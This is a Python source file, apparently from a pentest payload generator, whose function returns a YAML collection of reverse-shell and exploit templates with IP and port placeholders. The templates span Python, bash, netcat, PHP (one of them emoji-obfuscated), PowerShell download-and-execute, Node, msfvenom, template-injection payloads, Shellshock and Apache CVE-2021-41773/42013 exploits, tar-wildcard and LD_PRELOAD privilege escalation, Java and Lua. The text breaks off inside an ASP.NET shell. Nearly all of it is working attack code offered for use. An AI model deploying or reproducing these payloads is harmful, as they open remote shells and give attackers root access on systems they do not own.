def output_yaml():
    return r"""
payload:
  py:
    - |
      import socket
      import subprocess
      import os

      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(("{IP}",{PORT}))
      os.dup2(s.fileno(),0)
      os.dup2(s.fileno(),1)
      os.dup2(s.fileno(),2)
      p=subprocess.call(["/bin/sh","-i"])
    - |
      python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    - |
      __import__("os").system("nc -e /bin/sh {IP} {PORT}")
    - |
      __import__("os").system("echo {BASE64} | base64 -d | bash")
    - |
      __import__("subprocess").run("nc -e /bin/sh {IP} {PORT}".split(" "))
    - |
      eval("__impo"+"rt__('o"+"s').system('echo {BASE64} | base64 -d | bash')")
    - |
      wget${IFS}http://{IP}/shell.py${IFS}-O${IFS}shell.py;python${IFS}shell.py

      python -c 'import pty; pty.spawn("/bin/bash")'
    - |
      (Windows)
      python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{IP}', {PORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
  py3:
    - |
      import socket
      import subprocess
      import os

      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(("{IP}",{PORT}))
      os.dup2(s.fileno(),0)
      os.dup2(s.fileno(),1)
      os.dup2(s.fileno(),2)
      p=subprocess.call(["/bin/sh","-i"])
    - |
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    - |
      __import__("os").system("nc -e /bin/sh {IP} {PORT}")
    - |
      __import__("os").system("echo {BASE64} | base64 -d | bash")
    - |
      __import__("subprocess").run("nc -e /bin/sh {IP} {PORT}".split(" "))
    - |
      eval("__impo"+"rt__('o"+"s').system('echo {BASE64} | base64 -d | bash')")
    - |
      wget${IFS}http://{IP}/shell.py${IFS}-O${IFS}shell.py;python3${IFS}shell.py

      python3 -c 'import pty; pty.spawn("/bin/bash")'
    - |
      (Windows)
      python3.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{IP}', {PORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
  bash:
    - |
      bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
    - |
      0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196
    - |
      bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
    - |
      bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261
    - |
      bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%22
    - |
      echo {BASE64} | base64 -d | bash
    - |
      echo {BASE64_URLENCODE} | base64 -d | bash
    - |
      echo${IFS}{BASE64}|base64${IFS}-d|bash
    - |
      echo+{BASE64_URLENCODE}+|+base64+-d+|+bash
    - |
      echo '{BASE64_PY3}' | base64 -d | bash
  c:
    - |
      Compile : gcc shell.c -o shell

      #include <stdio.h>
      #include <sys/socket.h>
      #include <sys/types.h>
      #include <stdlib.h>
      #include <unistd.h>
      #include <netinet/in.h>
      #include <arpa/inet.h>

      int main(void){
        int port = {PORT};
        struct sockaddr_in revsockaddr;

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr("{IP}");

        connect(sockt, (struct sockaddr *) &revsockaddr,
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);

        return 0;
      }
    - |
      Compile : gcc -shared -o libchill.so -fPIC libchill.c

      #include<stdio.h>
      #include<stdlib.h>
      #include<unistd.h>
      int greetings(){
        setuid(0);
        setgid(0);
        system("/bin/bash");
      }
    - |
      Compile : gcc -o libchill.so.1 -shared -fPIC libchill.c
      Exploit : sudo LD_LIBRARY_PATH=/tmp <SOME BINARY>

      #include <stdio.h>
      #include <stdlib.h>

      static void hijack() __attribute__((constructor));

      void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
      }
    - |
      Compile : gcc -fPIC -shared -nostartfiles -o preload.so preload.c
      Exploit : sudo LD_PRELOAD=/tmp/preload.so binary

      #include <stdio.h>
      #include <sys/types.h>
      #include <stdlib.h>

      void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
      }
  nc:
    - |
      nc -e /bin/sh {IP} {PORT}
    - |
      nc {IP} {PORT} -e bash
    - |
      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f
    - |
      nc -e /u?r/b?n/b??? {IP} {PORT}
    - |
      nc {IP} {PORT} -e /u?r/b?n/b???
    - |
      nc.exe -e cmd.exe {IP} {PORT}
    - |
      nc.exe -nv {IP} {PORT} -e cmd.exe
  php:
    - |
      <?php
      set_time_limit (0);
      $VERSION = "1.0";
      $ip = "{IP}";
      $port = {PORT};
      $chunk_size = 1400;
      $write_a = null;
      $error_a = null;
      $shell = 'uname -a; w; id; /bin/sh -i';
      $daemon = 0;
      $debug = 0;
      if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();
        if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
        }
        if ($pid) {
        exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
        }
        $daemon = 1;
      } else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
      }
      chdir("/");
      umask(0);
      $sock = fsockopen($ip, $port, $errno, $errstr, 30);
      if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
      }
      $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
        1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
        2 => array("pipe", "w")   // stderr is a pipe that the child will write to
        );
      $process = proc_open($shell, $descriptorspec, $pipes);
      if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
      }
      stream_set_blocking($pipes[0], 0);
      stream_set_blocking($pipes[1], 0);
      stream_set_blocking($pipes[2], 0);
      stream_set_blocking($sock, 0);
      printit("Successfully opened reverse shell to $ip:$port");
      while (1) {
        if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
        }
        if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
        }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
        }
        }
        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        function printit ($string) {
        if (!$daemon) {
        print "$string\n";
        }
      }
      ?>
    - |
      {PHPEMOJI}
      <?php
      #Reverse shell
      $😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";
      $🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";
      $🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";
      $😘="n";$😗="o";$😙="p";$🤗="s";$😑="x";
      $💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;
      #IP Address
      $🚀 = {IP};
      #Port Number
      $💻 = {PORT};
      $🐚 = $🤨. $😐. $😶. $😘. $🤨. $😐. $🥰. $🤗. $🙄. $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;
      $🤣 =  $💀($🚀,$💻);
      $👽 = $😃. $😑. $😃. $😂;
      $👽($🐚);
      ?>
    - |
      # System()

      <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f'); ?>
      <?php system("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
      <?php system("echo {BASE64} | base64 -d | bash"); ?>
      <?php system("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash"); ?>
      <?php system("curl http://{IP}/shell.php|php"); ?>
    - |
      # Exec()

      <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
      <?php exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
      <?php exec("echo {BASE64} | base64 -d | bash"); ?>
      <?php exec("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash"); ?>
      <?php exec("curl http://{IP}/shell.php|php"); ?>
    - |
      # Shell_Exec()

      <?php shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
      <?php shell_exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
      <?php shell_exec("echo {BASE64} | base64 -d | bash"); ?>
      <?php shell_exec("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash"); ?>
      <?php shell_exec("curl http://{IP}/shell.php|php"); ?>
    - |
      # Passthru()

      <?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
      <?php passthru("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
      <?php passthru("echo {BASE64} | base64 -d | bash"); ?>
      <?php passthru("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash"); ?>
      <?php passthru("curl http://{IP}/shell.php|php"); ?>
    - |
      # Preg_replace()

      <?php preg_replace('/.*/e', 'system("echo {BASE64} | base64 -d | bash");', ''); ?>
      <?php preg_replace('/.*/e', 'exec("echo {BASE64} | base64 -d | bash");', ''); ?>
      <?php preg_replace('/.*/e', 'passthru("echo {BASE64} | base64 -d | bash");', ''); ?>
      <?php preg_replace('/.*/e', 'shell_exec("echo {BASE64} | base64 -d | bash");', ''); ?>
    - |
      # Backtick

      <?php $output = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f`; echo "<pre>$output</pre>"; ?>
      <?php $output = `/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'`; echo "<pre>$output</pre>"; ?>
      <?php $output = `echo {BASE64} | base64 -d | bash`; echo "<pre>$output</pre>"; ?>
      <?php $output = `echo+{BASE64_URLENCODE}+|+base64+-d+|+bash`; echo "<pre>$output</pre>"; ?>
      <?php $output = `curl http://{IP}/shell.php|php`; echo "<pre>$output</pre>"; ?>
    - |
      msfvenom -p php/reverse_php LHOST={IP} LPORT={PORT} -f raw -o shell.php
  perl:
    - |
      perl -e 'use Socket;$i="{IP}";           $p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    - |
      # Save as shell.pl
      # Exploit: perl shell.pl

      use Socket

      $i="{IP}";
      $p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
      if(connect(S,sockaddr_in($p,inet_aton($i)))){
        open(STDIN,">&S");
        open(STDOUT,">&S");
        open(STDERR,">&S");
        exec("/bin/sh -i");
      }
  ruby:
    - |
      ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{IP}",{PORT});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    - |
      require 'socket'

      c=TCPSocket.new("{IP}",{PORT})

      while(cmd=c.gets)
        IO.popen(cmd,"r"){
        |io|c.print io.read
        }
      end
    - |
      exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")
  haskell:
    - |
      module Main where

      import System.Process

      main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f"
  powershell:
    - |
      powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    - |
      $client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    - |
      #References => https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

      powershell.exe 'IEX(New-Object Net.WebClient).downloadString("http://{IP}/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}'
    - |
      powershell.exe 'IEX(New-Object Net.WebClient).downloadString("http://{IP}/Invoke-PowerShellTcp.ps1")'
    - |
      #References => https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1

      powershell.exe 'IEX(IWR http://{IP}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IP} {PORT}'
    - |
      powershell.exe 'iex(iwr -usebasicparsing http://{IP}/Invoke-PowerShellTcp.ps1)'
    - |
      powershell.exe -e {BASE64PS1}
    - |
      => Original : IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')

      powershell.exe -e {BASE64PS1_2}
    - |
      => Original : IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}

      powershell.exe -e {BASE64PS1_3}
  node:
    - |
      (function(){
      var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
      var client = new net.Socket();
      client.connect({PORT}, "{IP}", function(){
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
      });
      return /a/; // Prevents the Node.js application form crashing
      })();
    - |
      require("child_process").exec("nc -e /bin/sh {IP} {PORT}")
    - |
      require("child_process").exec("echo {BASE64} | base64 -d | bash")
    - |
      require("child_process").exec("echo '{BASE64_PY3}' | base64 -d | bash")
    - |
      require("child_process").exec("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash")
    - |
      {NODEJS_DESERIALIZATION}
      var net = require('net');
      var spawn = require('child_process').spawn;
      HOST="{IP}";
      PORT="{PORT}";
      TIMEOUT="5000";
      if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
      function c(HOST,PORT) {
      var client = new net.Socket();
      client.connect(PORT, HOST, function() {
      var sh = spawn('/bin/sh',[]);
      client.write("Connected!\\n");
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
      sh.on('exit',function(code,signal){
      client.end("Disconnected!\\n");
      });
      });
      client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
      });
      }
      c(HOST,PORT);
    - |
      sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
    - |
      # Others

      require('fs').readFileSync("/etc/passwd").toString('utf8')

      # require("child_process").exec()
      {NODE_BASE64}

      # Backdoor (curl localhost:3000/download?q=whoami)
      app.get('/download', (req, res) => {
          var url = req.query.q;
          require("child_process").exec(url, (error, stdout, stderr) => {
            if (error) {
              res.send(`exec error: ${error}`);
              return;
            }
            res.send(`stdout: ${stdout}`);
          });
      });
  awk:
    - |
      awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
  ncat:
    - |
      ncat {IP} {PORT} -e /bin/bash
    - |
      ncat --udp {IP} {PORT} -e /bin/bash
  msf_exe:
    - |
      msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o shell.exe

      msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o shell.exe
    - |
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f exe -o shell.exe

      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f exe -o shell.exe
    - |
      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f exe -e x86/shikata_ga_nai -b '\x00' -i 3 -o shell.exe

      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o shell.exe

      msfvenom -p windows/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o payload.exe

      msfvenom -p windows/x64/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o payload.exe

      msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o shell.exe

      msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o shell.exe
  ssti:
    - |
      #Twig

      {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nc -e /bin/sh {IP} {PORT}")}}
    - |
      #Jinja/Flask

      {{ config['RUNCMD']('bash -i >& /dev/tcp/{IP}/{PORT} 0>&1',shell=True) }}

      {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"')|attr('read')()}}

      {% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f').read()}}{%endif%}{%endfor%}
    - |
      # Tornado

      {% import os %}{{os.system('echo {BASE64} | base64 -d | bash')}}

      {% import os %}{{os.system('echo {BASE64_URLENCODE} | base64 -d | bash')}}
    - |
      # PugJS

      #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('echo {BASE64} | base64 -d | bash')}()}

      #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('echo {BASE64_URLENCODE} | base64 -d | bash')}()}


      #References

      https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
  cgibin:
    - |
      curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f'" http://localhost/cgi-bin/something.cgi
    - |
      curl -H "user-agent: () { :; }; echo; echo; echo {BASE64} | base64 -d | bash" http://localhost/cgi-bin/something.cgi
    - |
      ## Apache 2.4.49 (CVE-2021-41773)

      curl -s --path-as-is -d "echo Content-Type: text/plain; echo; echo {BASE64} | base64 -d | bash" "http://localhost/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
    - |
      ## Apache 2.4.50 (CVE-2021-42013)

      curl -s --path-as-is -d "echo Content-Type: text/plain; echo; echo {BASE64} | base64 -d | bash" "http://localhost/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
  jenkins:
    - |
      String host="{IP}";
      int port={PORT};
      String cmd="cmd.exe";
      Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    - |
      r = Runtime.getRuntime()
      p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
      p.waitFor()
  tarpriv:
    - |
      touch -- "--checkpoint=1"
      touch -- "--checkpoint-action=exec=sh shell.sh"
      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f" > shell.sh
      chmod 777 ./"--checkpoint=1"
      chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
      chmod 777 shell.sh
    - |
      touch -- "--checkpoint=1"
      touch -- "--checkpoint-action=exec=sh shell.sh"
      echo "" > shell.sh
      chmod 777 ./"--checkpoint=1"
      chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
      chmod 777 shell.sh
  pickle:
    - |
      {PICKLE}
    - |
      {PICKLE_BASH}
  java:
    - |
      Usage : java shell.java
      Usage : javac shell.java
      Usage : jar -cf shell.jar shell.class

      import java.io.BufferedReader;
      import java.io.InputStreamReader;

      public class shell {
        public static void main(String args[]) {
        String s;
        Process p;
        try {
          p = Runtime.getRuntime().exec("bash${IFS}-c${IFS}bash${IFS}-i${IFS}>&/dev/tcp/{IP}/{PORT}<&1");
          p.waitFor();
          p.destroy();
        } catch (Exception e) {}
        }
      }
    - |
      Usage : java shell.java
      Usage : javac shell.java
      Usage : jar -cf shell.jar shell.class

      import java.io.BufferedReader;
      import java.io.InputStreamReader;

      public class shell {
      public static void main(String args[]) {
      String s;
      Process p;
      try {
      p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{IP}/{PORT} 0>&1");
      p.waitFor();
      p.destroy();
      } catch (Exception e) {}
      }
      }
    - |
      Usage : java shell.java
      Usage : javac shell.java
      Usage : jar -cf shell.jar shell.class

      import java.io.BufferedReader;
      import java.io.InputStreamReader;

      public class shell {
      public static void main(String args[]) {
      String s;
      Process p;
      try {
      p = Runtime.getRuntime().exec("bash -c {echo,{BASE64}}|{base64,-d}|{bash,-i}");
      p.waitFor();
      p.destroy();
      } catch (Exception e) {}
      }
      }
    - |
      r = Runtime.getRuntime()
      p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
      p.waitFor()
  lua:
    - |
      os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")
    - |
      lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")'
  asp:
    - |
      #Save as shell.aspx/asp

      <%@ Page Language="C#" %>
      <%@ Import Namespace="System.Runtime.InteropServices" %>
      <%@ Import Namespace="System.Net" %>
      <%@ Import Namespace="System.Net.Sockets" %>
      <%@ Import Namespace="System.Security.Principal" %>
      <script runat="server">
      //Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
      //Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip

      protected void Page_Load(object sender, EventArgs e)
      {
      String host = "{IP}";
      int port = {PORT};

      CallbackShell(host, port);
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct STARTUPINFO
      {
      public int cb;
      public String lpReserved;
      public String lpDesktop;
      public String lpTitle;
      public uint dwX;
      public uint dwY;
      public uint dwXSize;
      public uint dwYSize;
      public uint dwXCountChars;
      public uint dwYCountChars;
      public uint dwFillAttribute;
      public uint dwFlags;
      public short wShowWindow;
      public short cbReserved2;
      public IntPtr lpReserved2;
